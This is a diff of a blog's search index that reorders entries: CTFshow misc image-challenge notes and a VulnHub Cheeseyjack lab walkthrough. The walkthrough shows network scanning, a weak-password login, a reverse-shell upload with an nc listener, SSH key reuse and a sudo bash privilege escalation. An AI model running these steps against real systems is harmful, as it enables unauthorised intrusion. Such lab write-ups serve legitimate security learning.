@@ -1,6 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTFshow-Misc入门-图片篇</title>
+    <url>/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/</url>
+    <content><![CDATA[<p>什么？又出新题了<br>还有一堆web没做，你怎么跑到Misc来摸鱼了？(大雾)<br>这个系列学累了偶尔来做一做，更新随缘~</p>
+<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h3><p>解压完直接打开即可<br>不会有人傻到一个一个对着打flag吧？不会吧不会吧？<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.png"></p>
+<span id="more"></span>
+<p><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.1.png"></p>
+<h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h3><p>打开txt发现是一堆乱码<br>看到文件头的字样推断是png图像<br>修改后缀格式即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.png"><br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.1.png"></p>
+<h3 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc 3"></a>Misc 3</h3><p>用bgp查看软件打开即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/3.png"></p>
+<h3 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc 4"></a>Misc 4</h3><p>一张一张的看<br>这种题什么也不考察 纯粹耍猴<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/4.png"></p>
+<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc 5"></a>Misc 5</h3><p>010 editor打开搜索ctf字样即可发现最后几行有flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/5.png"></p>
+<h3 id="Misc-6"><a href="#Misc-6" class="headerlink" title="Misc 6"></a>Misc 6</h3><p>没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/6.png"></p>
+<h3 id="Misc-7"><a href="#Misc-7" class="headerlink" title="Misc 7"></a>Misc 7</h3><p>也没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/7.png"></p>
+<h3 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h3><p>里面还藏着一个图片<br>binwalk或者手动提取图片即可<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/8.png"></p>
+<h3 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h3><p>还是没什么好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/9.png"></p>
+<h3 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h3><p>binwalk一把梭<br>打开其中一个文件可以发现flag</p>
+<hr>
+<blockquote>
+<p>生活不是选择，而是热爱。或许你我终将落俗，但浪漫至死不渝。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>CTF刷题合集</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTFshow 萌新web1-8</title>
     <url>/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/</url>
     <content><![CDATA[<h2 id="萌新区web1"><a href="#萌新区web1" class="headerlink" title="萌新区web1"></a>萌新区web1</h2><p>web选手培养中……<br>CTFshow这个平台简直不要太赞，以后刷题就在这里了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.0.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.1.png"><br>既然没有漏洞那我就不做了吧（滑稽）<br>这个注释，可以说很照顾萌新了</p>
@@ -23,35 +52,6 @@
 <hr>
 <blockquote>
 <p>阳光下的泡沫，是彩色的。</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>CTF刷题合集</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFshow-Misc入门-图片篇</title>
-    <url>/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/</url>
-    <content><![CDATA[<p>什么？又出新题了<br>还有一堆web没做，你怎么跑到Misc来摸鱼了？(大雾)<br>这个系列学累了偶尔来做一做，更新随缘~</p>
-<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h3><p>解压完直接打开即可<br>不会有人傻到一个一个对着打flag吧？不会吧不会吧？<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.png"></p>
-<span id="more"></span>
-<p><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.1.png"></p>
-<h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h3><p>打开txt发现是一堆乱码<br>看到文件头的字样推断是png图像<br>修改后缀格式即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.png"><br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.1.png"></p>
-<h3 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc 3"></a>Misc 3</h3><p>用bgp查看软件打开即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/3.png"></p>
-<h3 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc 4"></a>Misc 4</h3><p>一张一张的看<br>这种题什么也不考察 纯粹耍猴<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/4.png"></p>
-<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc 5"></a>Misc 5</h3><p>010 editor打开搜索ctf字样即可发现最后几行有flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/5.png"></p>
-<h3 id="Misc-6"><a href="#Misc-6" class="headerlink" title="Misc 6"></a>Misc 6</h3><p>没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/6.png"></p>
-<h3 id="Misc-7"><a href="#Misc-7" class="headerlink" title="Misc 7"></a>Misc 7</h3><p>也没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/7.png"></p>
-<h3 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h3><p>里面还藏着一个图片<br>binwalk或者手动提取图片即可<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/8.png"></p>
-<h3 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h3><p>还是没什么好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/9.png"></p>
-<h3 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h3><p>binwalk一把梭<br>打开其中一个文件可以发现flag</p>
-<hr>
-<blockquote>
-<p>生活不是选择，而是热爱。或许你我终将落俗，但浪漫至死不渝。</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -182,52 +182,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶机Cheesey:Cheeseyjack渗透记录</title>
-    <url>/2021/07/22/Cheesey-Cheeseyjack/</url>
-    <content><![CDATA[<p>本来懒得写，但是写完搜了一下发现这个靶机的笔记比较少，就发出来供大家参考。<br>本人巨菜，轻喷。</p>
-<hr>
-<blockquote>
-<p>下载地址：<a href="https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/">https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/</a></p>
-</blockquote>
-<hr>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Cheesey: Cheeseyjack×1<br>渗透机kali 2021.2×1 和靶机在同一网段</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机，看一下mac地址。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/1.png"><br>扫描内网，根据mac地址判断渗透靶机的ip。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/2.png"><br>nmap信息探测。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.134</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/3.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/4.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/5.png"></p>
-<span id="more"></span>
-<p>开了不少端口，先记着。web服务开着，先去瞅一眼<br><img src="/2021/07/22/Cheesey-Cheeseyjack/6.png"><br>随便点点，这个网页上还有一些信息，也要收集起来。<br>接下来试着用gobuster扫一下看看（基于go语言的扫描器，高速好用！）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/7.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/8.png"><br>扫到的地址去访问看一下<br>是后台登录界面<br><img src="/2021/07/22/Cheesey-Cheeseyjack/9.png"><br>这个目录藏着一个文档<br><img src="/2021/07/22/Cheesey-Cheeseyjack/10.png"><br>打开看一下<br><img src="/2021/07/22/Cheesey-Cheeseyjack/11.png"><br>吐槽密码设置的太简单了，应该就是弱口令。先把这个信息收集起来。<br>扫一下这个后台登录界面，看看有什么东西。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/project_management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/12.png"><br>访问一下。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/13.png"><br>在databases.yml发现了点信息。不管有用没有，收集起来再说。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/14.png"><br>试着用enum4linux看看能不能收集到啥【enum4linux是Kali Linux自带的一款信息收集工具】</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.55.134</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#x63;&#104;&#51;&#51;&#115;&#x33;&#x6d;&#x34;&#x6e;&#64;&#x63;&#x68;&#101;&#x65;&#x73;&#x65;&#121;&#106;&#x61;&#99;&#x6b;&#x2e;&#108;&#111;&#99;&#x61;&#108;">&#x63;&#104;&#51;&#51;&#115;&#x33;&#x6d;&#x34;&#x6e;&#64;&#x63;&#x68;&#101;&#x65;&#x73;&#x65;&#121;&#106;&#x61;&#99;&#x6b;&#x2e;&#108;&#111;&#99;&#x61;&#108;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/20.png"><br>刚才收集到了uploads文件夹，找到shell.php点击即可。<br>![](21 (2).png)<br><img src="/2021/07/22/Cheesey-Cheeseyjack/21.png"><br>因为自带有python3环境【可以用which python找路径】<br>所以这里还可以打一个反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p>发现有两个用户，于是去crab那里看一下<br><img src="/2021/07/22/Cheesey-Cheeseyjack/22.png"><br>发现了一个todo.txt 打开获得了一点小提示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Scold cheese for weak qdpm password (done)</span><br><span class="line">2. Backup SSH keys to /var/backups</span><br><span class="line">3. Change cheese&#x27;s weak password</span><br><span class="line">4. Milk</span><br><span class="line">5. Eggs</span><br><span class="line">6. Stop putting my grocery list on my todo lists</span><br></pre></td></tr></table></figure>
-<p>直接枚举/var/backups的所有内容，发现里面有一个ssh的备份<br><img src="/2021/07/22/Cheesey-Cheeseyjack/23.png"><br>复制粘贴，然后放到文本里<br><img src="/2021/07/22/Cheesey-Cheeseyjack/24.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/25.png"><br>另开一个终端，修改权限，注意必须是600！<br>修改权限后，链接。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i sshkey crab@192.168.55.134</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/26.png"><br>很明显接下来要提权了，直接<code>sudo -l</code><br><img src="/2021/07/22/Cheesey-Cheeseyjack/27.png"><br>可以发现/home/crab/.bin/就是突破点。crab可以用sudo在这个目录运行所有的内容<br><img src="/2021/07/22/Cheesey-Cheeseyjack/28.png"><br>确定目标后提权就简单了，把bash shell复制到这个目录下，以sudo临时运行 bash，就可以获得root权限了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /home/crab/.bin/bash</span><br><span class="line">sudo /home/crab/.bin/bash -p</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/29.png"><br>导航到根目录,发现有个root.txt。打开即可获得flag<br><img src="/2021/07/22/Cheesey-Cheeseyjack/30.png"><br>至此，渗透结束。</p>
-<hr>
-<blockquote>
-<p>今天再大的事，到了明天就是小事；今年再大的事，到了明年就是故事。</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>靶机渗透记录</category>
-      </categories>
-      <tags>
-        <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTFshow 萌新区杂项1-11</title>
     <url>/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/</url>
     <content><![CDATA[<p>CTFshow刷题合集之萌新杂项~</p>
@@ -263,55 +217,49 @@
       </tags>
   </entry>
   <entry>
-    <title>Red Hat 7配置samba服务器</title>
-    <url>/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[<p>是Linux学习，也是社团作业。<br>因为要求到点交，就认真的写了一下。<br>挺简单的，完全没啥需要注意的<br>学长给的步骤好多，有的感觉没必要，但还是照着操作了</p>
-<blockquote>
-<p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p>
-</blockquote>
-<span id="more"></span>
-<h2 id="打开物理机-修改IP地址"><a href="#打开物理机-修改IP地址" class="headerlink" title="打开物理机 修改IP地址"></a>打开物理机 修改IP地址</h2><p>物理机Win+R打开cmd  输入ipconfig查看当前ip<br>我们的虚拟机只需要和物理机配在同一网段就可以了</p>
-<h2 id="打开虚拟机-修改IP地址"><a href="#打开虚拟机-修改IP地址" class="headerlink" title="打开虚拟机 修改IP地址"></a>打开虚拟机 修改IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png"><br>进入vi模式后，按i开始编辑，变化前后如下</p>
-<h4 id="编辑前"><a href="#编辑前" class="headerlink" title="编辑前"></a>编辑前</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png"></p>
-<h4 id="编辑后"><a href="#编辑后" class="headerlink" title="编辑后"></a>编辑后</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png"></p>
-<p>按ESC退出编辑 shift+:（冒号）至底部并输入wq后回车即可保存</p>
-<h2 id="重启网络服务"><a href="#重启网络服务" class="headerlink" title="重启网络服务"></a>重启网络服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>
-
-<h2 id="创建挂载点"><a href="#创建挂载点" class="headerlink" title="创建挂载点"></a>创建挂载点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/cdrom</span><br></pre></td></tr></table></figure>
-
-<h2 id="链接光盘"><a href="#链接光盘" class="headerlink" title="链接光盘"></a>链接光盘</h2><p>点击vm左下角光盘图标即可<br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png"></p>
-<h2 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h2><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png"></p>
-<h2 id="创建本地yum源"><a href="#创建本地yum源" class="headerlink" title="创建本地yum源"></a>创建本地yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/dev.repo</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/6.png"></p>
-<h2 id="清理yum源"><a href="#清理yum源" class="headerlink" title="清理yum源"></a>清理yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/7.png"></p>
-<h2 id="安装samba"><a href="#安装samba" class="headerlink" title="安装samba"></a>安装samba</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install samba</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/8.png"><br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/8.1.png"></p>
-<h2 id="配置samba的配置文件"><a href="#配置samba的配置文件" class="headerlink" title="配置samba的配置文件"></a>配置samba的配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>
-
-<h4 id="配置前："><a href="#配置前：" class="headerlink" title="配置前："></a>配置前：</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/9.png"></p>
-<h4 id="配置后："><a href="#配置后：" class="headerlink" title="配置后："></a>配置后：</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/10.png"></p>
-<h2 id="创建共享位置并设置权限"><a href="#创建共享位置并设置权限" class="headerlink" title="创建共享位置并设置权限"></a>创建共享位置并设置权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /opt/share</span><br><span class="line">chmod 777 /opt/share</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/11.png"></p>
-<h2 id="创建smb用户"><a href="#创建smb用户" class="headerlink" title="创建smb用户"></a>创建smb用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbpasswd -a 用户名</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/12.png"> </p>
-<h2 id="重启samba服务"><a href="#重启samba服务" class="headerlink" title="重启samba服务"></a>重启samba服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service smb restart</span><br><span class="line">service nmb restart</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/13.png"></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>物理机打开我的电脑 输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\虚拟机的IP地址</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/14.png"><br>输入在虚拟机里设置的用户名和密码即可<br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/15.png"></p>
+    <title>靶机Cheesey:Cheeseyjack渗透记录</title>
+    <url>/2021/07/22/Cheesey-Cheeseyjack/</url>
+    <content><![CDATA[<p>本来懒得写，但是写完搜了一下发现这个靶机的笔记比较少，就发出来供大家参考。<br>本人巨菜，轻喷。</p>
 <hr>
 <blockquote>
-<p>没有比人更高的山,没有比脚更长的路</p>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/">https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/</a></p>
+</blockquote>
+<hr>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Cheesey: Cheeseyjack×1<br>渗透机kali 2021.2×1 和靶机在同一网段</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机，看一下mac地址。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/1.png"><br>扫描内网，根据mac地址判断渗透靶机的ip。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/2.png"><br>nmap信息探测。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.134</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/3.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/4.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/5.png"></p>
+<span id="more"></span>
+<p>开了不少端口，先记着。web服务开着，先去瞅一眼<br><img src="/2021/07/22/Cheesey-Cheeseyjack/6.png"><br>随便点点，这个网页上还有一些信息，也要收集起来。<br>接下来试着用gobuster扫一下看看（基于go语言的扫描器，高速好用！）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/7.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/8.png"><br>扫到的地址去访问看一下<br>是后台登录界面<br><img src="/2021/07/22/Cheesey-Cheeseyjack/9.png"><br>这个目录藏着一个文档<br><img src="/2021/07/22/Cheesey-Cheeseyjack/10.png"><br>打开看一下<br><img src="/2021/07/22/Cheesey-Cheeseyjack/11.png"><br>吐槽密码设置的太简单了，应该就是弱口令。先把这个信息收集起来。<br>扫一下这个后台登录界面，看看有什么东西。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/project_management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/12.png"><br>访问一下。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/13.png"><br>在databases.yml发现了点信息。不管有用没有，收集起来再说。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/14.png"><br>试着用enum4linux看看能不能收集到啥【enum4linux是Kali Linux自带的一款信息收集工具】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.55.134</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#x63;&#104;&#x33;&#x33;&#x73;&#51;&#x6d;&#x34;&#x6e;&#x40;&#99;&#104;&#101;&#101;&#115;&#101;&#x79;&#x6a;&#97;&#99;&#107;&#46;&#x6c;&#111;&#99;&#97;&#108;">&#x63;&#104;&#x33;&#x33;&#x73;&#51;&#x6d;&#x34;&#x6e;&#x40;&#99;&#104;&#101;&#101;&#115;&#101;&#x79;&#x6a;&#97;&#99;&#107;&#46;&#x6c;&#111;&#99;&#97;&#108;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/20.png"><br>刚才收集到了uploads文件夹，找到shell.php点击即可。<br>![](21 (2).png)<br><img src="/2021/07/22/Cheesey-Cheeseyjack/21.png"><br>因为自带有python3环境【可以用which python找路径】<br>所以这里还可以打一个反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p>发现有两个用户，于是去crab那里看一下<br><img src="/2021/07/22/Cheesey-Cheeseyjack/22.png"><br>发现了一个todo.txt 打开获得了一点小提示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Scold cheese for weak qdpm password (done)</span><br><span class="line">2. Backup SSH keys to /var/backups</span><br><span class="line">3. Change cheese&#x27;s weak password</span><br><span class="line">4. Milk</span><br><span class="line">5. Eggs</span><br><span class="line">6. Stop putting my grocery list on my todo lists</span><br></pre></td></tr></table></figure>
